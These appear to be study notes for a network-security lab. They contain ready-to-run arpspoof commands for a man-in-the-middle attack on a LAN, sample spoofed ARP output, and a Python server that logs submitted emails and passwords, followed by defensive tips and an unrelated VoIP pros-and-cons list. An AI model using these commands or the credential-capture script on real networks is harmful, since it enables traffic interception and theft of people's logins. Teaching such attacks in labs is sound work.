Kali Linux — arpspoof attack
# Terminal 1: Enable IP forwarding
$ echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 2: ARP spoof gateway → client
$ arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 3: ARP spoof client → gateway
$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

0:c:29:aa:bb:cc 0:c:29:11:22:33 0806 42:
arp reply 192.168.1.1 is-at 0:c:29:aa:bb:cc
arp reply 192.168.1.10 is-at 0:c:29:aa:bb:cc
What just happened?
⚠ARP has no authentication. Any machine can claim to be any IP address.
Cause: No ARP authentication in standard LAN protocol
Vulnerability: LAN trust model — all machines trust ARP broadcasts
Impact: Data theft, credential capture, MiTM attack

# capture.py — receives POST data
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
def do_POST(self):
length = int(self.headers['Content-Length'])
data = parse_qs(self.rfile.read(length))
print(f"CAPTURED: {data}")
# logs: email + password

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
Prevention Tips to Document:
✓ Always check the URL bar before entering credentials
✓ Look for the HTTPS padlock (green lock)
✓ Enable 2FA — even captured password won't work
✓ Use a password manager (flags wrong domains)

VoIP Benefits
✓ Low cost — no PSTN charges for long-distance
✓ Scalable — add extensions via software config
✓ Flexible — works on any IP network globally
✓ Features — conferencing, IVR, call recording
✓ Integration — CRM, video, messaging unified
VoIP Limitations
✗ Latency — high ping causes echo/delay (>150ms bad)
✗ Packet loss — choppy audio if >1% packets lost
✗ Power dependent — fails during power outage
✗ Jitter — variable delay disrupts real-time audio
✗ Security — SIP exposed to toll fraud / eavesdrop
